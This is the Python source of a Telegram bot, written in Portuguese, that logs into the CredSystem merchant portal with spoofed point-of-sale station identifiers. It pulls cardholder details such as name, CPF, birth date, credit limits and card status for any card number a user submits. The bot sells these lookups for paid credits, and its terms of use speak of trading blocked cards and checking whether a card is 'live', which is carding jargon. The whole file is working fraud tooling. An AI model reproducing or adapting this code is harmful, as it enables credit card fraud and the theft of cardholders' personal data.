from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from bs4 import BeautifulSoup
import requests, os, json
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.environ["BOT_TOKEN"]
LOG_CHAT_ID = int(os.environ["LOG_CHAT_ID"])
LOGIN_USUARIO = os.environ["LOGIN_USUARIO"]
LOGIN_SENHA = os.environ["LOGIN_SENHA"]

ADMIN_IDS = [1797218982, 1822593355]
USUARIOS_PATH = "usuarios.json"

def carregar_usuarios():
    try:
        with open(USUARIOS_PATH, "r") as f:
            return json.load(f)
    except:
        return {}

def salvar_usuarios(usuarios):
    with open(USUARIOS_PATH, "w") as f:
        json.dump(usuarios, f, indent=2)

usuarios = carregar_usuarios()

def is_admin(user_id):
    return int(user_id) in ADMIN_IDS

def get_user(user_id, username=None):
    user_id = str(user_id)
    if user_id not in usuarios:
        usuarios[user_id] = {"creditos": 0, "vitalicio": False, "consultas": []}
    # Atualiza username salvo caso venha
    if username is not None:
        usuarios[user_id]["username"] = username
    # Admins são vitalícios sempre
    if is_admin(user_id):
        usuarios[user_id]["vitalicio"] = True
    if "consultas" not in usuarios[user_id]:
        usuarios[user_id]["consultas"] = []
    return usuarios[user_id]

def set_user(user_id, user_data):
    if is_admin(user_id):
        user_data["vitalicio"] = True
    usuarios[str(user_id)] = user_data
    salvar_usuarios(usuarios)

ESTACAO_PAYLOAD = {
    "spID": "500",
    "userStationIdentificationHash": "4FDE-CFF5-0ACE-A54C-FCC7-91A1-A841-6088",
    "userStationIPAddress": "169.254.185.102",
    "userStationName": "LS1-PDV-02",
    "userStationIdentifications[]": [
        "64:1C:67:B1:49:D1",
        "00:E0:24:4F:D8:4A"
    ]
}
REFERER = "https://www.portalcredsystem.com.br/credsystem-sso-idp//authentication/logout?spID=500&alreadyLoggedOut=true"
ORIGIN = "https://www.portalcredsystem.com.br"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
COOKIE_PATH = "auth_cookie.txt"

def salvar_cookie(cookie):
    with open(COOKIE_PATH, "w") as f:
        f.write(cookie)

def carregar_cookie():
    try:
        with open(COOKIE_PATH, "r") as f:
            return f.read()
    except:
        return ""

def renovar_cookie():
    session = requests.Session()
    try:
        login_url = "https://www.portalcredsystem.com.br/credsystem-sso-idp/authentication/login/user"
        login_payload = {
            "username": LOGIN_USUARIO,
            "password": LOGIN_SENHA,
            "captchaResponse": "",
            "idCaptcha": "",
        }
        login_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": USER_AGENT,
            "Origin": ORIGIN,
            "Referer": REFERER,
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json, text/javascript, */*; q=0.01",
        }
        session.post(login_url, data=login_payload, headers=login_headers)

        adddata_url = "https://www.portalcredsystem.com.br/credsystem-sso-idp/authentication/login/user/additionalData"
        adddata_headers = login_headers.copy()
        r2 = session.post(adddata_url, data=ESTACAO_PAYLOAD, headers=adddata_headers)
        adddata_json = r2.json()
        establishment_id = str(adddata_json["estabelecimentos"][0]["id"])

        confirm_url = "https://www.portalcredsystem.com.br/credsystem-sso-idp/authentication/login/confirm"
        confirm_headers = login_headers.copy()
        confirm_payload = {
            "spID": "500",
            "isLoginCompletion": "false",
            "establishmentID": establishment_id,
            "redeID": "",
        }
        session.post(confirm_url, data=confirm_payload, headers=confirm_headers)

        cookie_str = "; ".join([f"{c.name}={c.value}" for c in session.cookies])
        if "CREDSYSTEM-AUTH-TOKEN" in cookie_str:
            salvar_cookie(cookie_str)
            return cookie_str
        else:
            print("❌ Não foi possível obter o CREDSYSTEM-AUTH-TOKEN.")
            return None
    except Exception as e:
        print("Erro ao renovar cookie:", e)
        return None

def get_auth_cookie():
    cookie = carregar_cookie()
    if not cookie or "CREDSYSTEM-AUTH-TOKEN" not in cookie:
        cookie = renovar_cookie()
    return cookie

def checar_html_vazio(html):
    soup = BeautifulSoup(html, "html.parser")
    if not soup.find("table") and not soup.find("div", class_="row boxs dados-cartao"):
        return True
    return False

def consultar_cartao(numero_cartao, tentativas=2):
    url = "https://www.portalcredsystem.com.br/websystem/cartao/limite-situacao/consulta-cartao"
    for tentativa in range(tentativas):
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.portalcredsystem.com.br",
            "Referer": "https://www.portalcredsystem.com.br/websystem/cartao/limite-situacao",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": USER_AGENT,
            "Cookie": get_auth_cookie()
        }
        data = {"tipoConsulta": "NUMERO_CARTAO", "valor": numero_cartao}
        resp = requests.post(url, headers=headers, data=data)
        html = resp.text
        if not checar_html_vazio(html):
            return html, False
        if tentativa == 0:
            renovar_cookie()
    return html, True

def consultar_dados_cliente(numero_cartao, tentativas=2):
    url = "https://www.portalcredsystem.com.br/websystem/arrecadacao/parcela-extrato/consulta"
    for tentativa in range(tentativas):
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.portalcredsystem.com.br",
            "Referer": "https://www.portalcredsystem.com.br/websystem/arrecadacao/parcela-extrato",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": USER_AGENT,
            "Cookie": get_auth_cookie()
        }
        data = {"extratoValidar": "100000000", "tipoConsulta": "NUMERO_CARTAO", "valor": numero_cartao}
        resp = requests.post(url, headers=headers, data=data)
        html = resp.text
        if not checar_html_vazio(html):
            return html, False
        if tentativa == 0:
            renovar_cookie()
    return html, True

def parsear_cartao(html):
    soup = BeautifulSoup(html, "html.parser")
    tabela = soup.find("table")
    dados = {}
    limite_emergencial = "0,00"
    limite_emergencial_disponivel = "0,00"
    opt_in_detectado = False

    if tabela:
        for linha in tabela.find_all("tr"):
            colunas = linha.find_all("td")
            if len(colunas) >= 2:
                chave = colunas[0].get_text(strip=True)
                valor_texto = colunas[1].get_text(strip=True)
                dados[chave] = valor_texto

                if "limite emergencial disponível" in chave.lower():
                    limite_emergencial_disponivel = valor_texto.split()[0].replace(".", "").replace(",", ".")
                if "limite emergencial estipulado" in chave.lower():
                    partes = valor_texto.split()
                    limite_emergencial = partes[0].replace(".", "").replace(",", ".")
                    if len(colunas) >= 3:
                        input_opt = colunas[2].find("input", {"id": "botaoOptinMensagem"})
                        if input_opt and "opt-in" in input_opt.get("value", "").lower():
                            opt_in_detectado = True

    if opt_in_detectado:
        limite_emergencial = "{:,.2f}".format(float(limite_emergencial)).replace(",", "X").replace(".", ",").replace("X", ".")
        limite_emergencial_disponivel = "{:,.2f}".format(float(limite_emergencial_disponivel)).replace(",", "X").replace(".", ",").replace("X", ".")
    else:
        limite_emergencial = "0,00"
        limite_emergencial_disponivel = "0,00"

    return {
        "nome": dados.get("Nome do Cliente", ""),
        "cartao": dados.get("Nome do Cartão", ""),
        "numero": dados.get("Número do Cartão", ""),
        "limite_total": dados.get("Limite de Crédito do Cartão", ""),
        "limite_disponivel": dados.get("Limite Disponível Compras Dentro da Rede", ""),
        "limite_emergencial": limite_emergencial,
        "limite_emergencial_disponivel": limite_emergencial_disponivel,
        "vencimento": dados.get("Vencimento Extrato", ""),
        "situacao": dados.get("Situação do Cartão", "")
    }

def parsear_cliente(html):
    soup = BeautifulSoup(html, "html.parser")
    div = soup.find("div", class_="row boxs dados-cartao")
    nome = cpf = nascimento = ""
    if div:
        nome_bloco = div.find("strong", string=lambda t: t and "Nome" in t)
        if nome_bloco and nome_bloco.find_next("th:blcock"):
            nome = nome_bloco.find_next("th:blcock").text.strip()
        cpf_bloco = div.find("strong", string=lambda t: t and "CPF" in t)
        if cpf_bloco and cpf_bloco.find_next("th:blcock"):
            cpf = cpf_bloco.find_next("th:blcock").text.strip()
        nasc_bloco = div.find("strong", string=lambda t: t and "Nascimento" in t)
        if nasc_bloco and nasc_bloco.find_next("th:blcock"):
            nascimento = nasc_bloco.find_next("th:blcock").text.strip()
    return {"nome": nome, "cpf": cpf, "nascimento": nascimento}

def montar_mensagem_completa(cliente, cartao, creditos, is_vitalicio):
    if cartao["limite_emergencial"] != "0,00":
        limite_emergencial = f"{cartao['limite_emergencial']} (Disponível: {cartao['limite_emergencial_disponivel']})"
    else:
        limite_emergencial = "0,00"
    mensagem = f"""
🧑‍💼 Nome: {cliente['nome']}
🆔 CPF: {cliente['cpf']}
🎂 Nascimento: {cliente['nascimento']}

💳 Cartão: {cartao['cartao']} ({cartao['numero']})
📚 Limite Total: R$ {cartao['limite_total']}
✅ Limite Disponível: R$ {cartao['limite_disponivel']}
❗ Limite Emergencial: R$ {limite_emergencial}
📅 Vencimento: Dia {cartao['vencimento']}
🟢 Situação: {cartao['situacao']}
""".strip()
    if not is_vitalicio:
        mensagem += f"\n\n💰 Você possui {creditos if creditos >= 0 else 0} crédito(s)"
    return mensagem

async def enviar_log(texto):
    pass  # Logs desativados
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    user = get_user(user_id, username=username)
    await enviar_log(f"Comando /start por {update.effective_user.name} ({user_id})")
    texto = (
        "👋 Olá! Seja bem-vindo ao bot de consultas.\n\n"
        "Antes de começar, leia os <b>termos de uso</b> com /termos.\n"
        "Veja os pacotes disponíveis usando /pacotes.\n\n"
        "Para consultar sua cc CredSystem ultilize /consultar (16 dígitos da cc).\n\n"
        "Dúvidas? Chame @bocade69 no privado."
    )
    await update.message.reply_text(texto, parse_mode="HTML")

async def termos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    termos_txt = (
        "📢 <b>Termos de Uso</b>\n\n"
        "• Trocamos CCs que estejam <b>bloqueadas</b> (exceto <b>BLOQ.ATRASO</b>).\n"
        "• <b>Atenção:</b> Não abuse do sistema — verifique você mesmo se a CC está live antes de consultá-la.\n"
        "• CCs consultadas uma vez poderão ser consultadas novamente quantas vezes você desejar <b>sem gastar créditos</b>.\n\n"
        "❓ Dúvidas? Chame @bocade69 no privado."
    )
    await update.message.reply_text(termos_txt, parse_mode="HTML")

async def pacotes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pacotes_txt = (
        "💳 <b>Pacotes de Créditos</b>:\n\n"
        "💰 1 crédito: <b>R$30</b>\n"
        "💰 5 créditos: <b>R$125</b>\n"
        "💰 10 créditos: <b>R$230</b>\n"
        "💰 15 créditos: <b>R$330</b>\n"
        "💰 Vitalício : <b>R$2K</b>"
    )
    await update.message.reply_text(pacotes_txt, parse_mode="HTML")

async def listar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = update.effective_user.id
    if not is_admin(admin_id):
        await update.message.reply_text("Apenas admin pode listar usuários.")
        await enviar_log(f"Usuário NÃO ADMIN {update.effective_user.name} ({admin_id}) tentou /listar")
        return
    texto = "👥 Usuários cadastrados:\n\n"
    for uid, u in usuarios.items():
        username = u.get("username", "")
        username_str = f" @{username}" if username else ""
        status = "vitalício" if u.get("vitalicio") else f"{u.get('creditos', 0)} crédito(s)"
        texto += f"ID: {uid}{username_str} - {status}\n"
    await update.message.reply_text(texto)
    await enviar_log(f"Admin {update.effective_user.name} ({admin_id}) usou /listar")

async def consultar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    user = get_user(user_id, username=username)
    username_display = username or update.effective_user.name

    if not context.args or not context.args[0].isdigit() or len(context.args[0]) != 16:
        await update.message.reply_text("Use: /consultar <cartão> (16 dígitos)")
        await enviar_log(f"Consulta mal formatada por {username_display} ({user_id}): {update.message.text}")
        return

    numero_cartao = context.args[0]
    if "consultas" not in user:
        user["consultas"] = []

    consulta_repetida = numero_cartao in user["consultas"]

    # Se for repetida, permite SEM saldo, SEM desconto
    if consulta_repetida:
        html_cartao, _ = consultar_cartao(numero_cartao)
        html_cliente, _ = consultar_dados_cliente(numero_cartao)
        if checar_html_vazio(html_cartao) or checar_html_vazio(html_cliente):
            await update.message.reply_text("❌ Sessão expirada ou dados indisponíveis. Tente novamente em instantes.")
            await enviar_log(f"Consulta falhou (HTML vazio) para {numero_cartao} por {username_display} ({user_id}) [repetida]")
            return
        cartao = parsear_cartao(html_cartao)
        cliente = parsear_cliente(html_cliente)
        resposta = montar_mensagem_completa(cliente, cartao, user.get("creditos", 0), user.get("vitalicio", False))
        await update.message.reply_text(resposta)
        await enviar_log(
            f"Consulta REPETIDA por {username_display} ({user_id})\n"
            f"Cartão: {numero_cartao}\n"
            f"Créditos: {user.get('creditos', 0)}\n"
            f"Resposta enviada:\n{resposta}"
        )
        set_user(user_id, user)
        return

    # Se não for repetida, checa saldo normalmente:
    if not (user.get("vitalicio") or user.get("creditos", 0) > 0):
        msg = (
            "❌ Você não possui créditos suficientes para realizar consultas.\n"
            "Fale com @bocade69 para adicionar créditos ou adquirir vitalício."
        )
        await update.message.reply_text(msg)
        await enviar_log(f"Consulta negada: {username_display} ({user_id}) tentou consultar com saldo insuficiente. Créditos: {user.get('creditos', 0)}")
        return

    await update.message.reply_text("🔍 Consultando...")

    html_cartao, _ = consultar_cartao(numero_cartao)
    html_cliente, _ = consultar_dados_cliente(numero_cartao)
    if checar_html_vazio(html_cartao) or checar_html_vazio(html_cliente):
        await update.message.reply_text("❌ Sessão expirada ou dados indisponíveis. Tente novamente em instantes.")
        await enviar_log(f"Consulta falhou (HTML vazio) para {numero_cartao} por {username_display} ({user_id}) [nova]")
        return

    cartao = parsear_cartao(html_cartao)
    cliente = parsear_cliente(html_cliente)

    # Debita crédito se não for vitalício e não for repetida
    if not user.get("vitalicio"):
        user["creditos"] -= 1

    # Marca o cartão como consultado e SALVA
    user["consultas"].append(numero_cartao)
    set_user(user_id, user)

    resposta = montar_mensagem_completa(cliente, cartao, user.get("creditos", 0), user.get("vitalicio", False))
    await update.message.reply_text(resposta)

    await enviar_log(
        f"Consulta NOVA por {username_display} ({user_id})\n"
        f"Cartão: {numero_cartao}\n"
        f"Créditos: {user.get('creditos', 0)}\n"
        f"Resposta enviada:\n{resposta}"
    )

async def add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = update.effective_user.id
    if not is_admin(admin_id):
        await update.message.reply_text("Apenas admin pode adicionar crédito.")
        await enviar_log(f"Usuário NÃO ADMIN {update.effective_user.name} ({admin_id}) tentou /add: {update.message.text}")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Use: /add <qtd> <user_id>")
        return
    qtd, userid = int(context.args[0]), context.args[1]
    u = get_user(userid)
    u["creditos"] += qtd
    set_user(userid, u)
    await update.message.reply_text(f"Adicionado {qtd} crédito(s) para {userid}.")
    await enviar_log(f"Admin {update.effective_user.name} ({admin_id}) adicionou {qtd} crédito(s) para {userid} (total: {u['creditos']})")

async def vitalicio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = update.effective_user.id
    if not is_admin(admin_id):
        await update.message.reply_text("Apenas admin pode liberar vitalício.")
        await enviar_log(f"Usuário NÃO ADMIN {update.effective_user.name} ({admin_id}) tentou /vitalicio: {update.message.text}")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Use: /vitalicio <user_id>")
        return
    userid = context.args[0]
    u = get_user(userid)
    u["vitalicio"] = True
    set_user(userid, u)
    await update.message.reply_text(f"Usuário {userid} agora é vitalício!")
    await enviar_log(f"Admin {update.effective_user.name} ({admin_id}) liberou vitalício para {userid}")

async def forcarlogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = update.effective_user.id
    if not is_admin(admin_id):
        await update.message.reply_text("Apenas admin pode usar este comando.")
        await enviar_log(f"Usuário NÃO ADMIN {update.effective_user.name} ({admin_id}) tentou /forcarlogin")
        return
    try:
        resultado = renovar_cookie()
        if resultado:
            await update.message.reply_text("🔑 Login forçado realizado com sucesso!")
            await enviar_log(f"Admin {update.effective_user.name} ({admin_id}) forçou login com sucesso.")
        else:
            await update.message.reply_text("❌ Falha ao forçar login.")
            await enviar_log(f"Admin {update.effective_user.name} ({admin_id}) tentou forçar login, mas FALHOU.")
    except Exception as e:
        await update.message.reply_text(f"❌ Falha ao forçar login: {e}")
        await enviar_log(f"Erro no /forcarlogin por {update.effective_user.name} ({admin_id}): {e}")

async def publicar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = update.effective_user.id
    if not is_admin(admin_id):
        await update.message.reply_text("Apenas admin pode usar este comando.")
        await enviar_log(f"Usuário NÃO ADMIN {update.effective_user.name} ({admin_id}) tentou /publicar")
        return

    if not context.args:
        await update.message.reply_text("Use: /publicar <mensagem>")
        return

    mensagem = " ".join(context.args)
    enviados = 0
    falhas = 0

    for uid in usuarios.keys():
        try:
            await context.bot.send_message(chat_id=int(uid), text=mensagem)
            enviados += 1
        except Exception as e:
            falhas += 1
            await enviar_log(f"Falha ao enviar mensagem para {uid}: {e}")

    await update.message.reply_text(f"Mensagem enviada para {enviados} usuário(s). Falhas: {falhas}")
    await enviar_log(f"Admin {update.effective_user.name} ({admin_id}) usou /publicar: '{mensagem}' ({enviados} enviados, {falhas} falhas)")

# --- MAIN ---
app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("consultar", consultar))
app.add_handler(CommandHandler("add", add))
app.add_handler(CommandHandler("vitalicio", vitalicio))
app.add_handler(CommandHandler("listar", listar))
app.add_handler(CommandHandler("forcarlogin", forcarlogin))
app.add_handler(CommandHandler("termos", termos))
app.add_handler(CommandHandler("pacotes", pacotes))
app.add_handler(CommandHandler("publicar", publicar))
app.run_polling()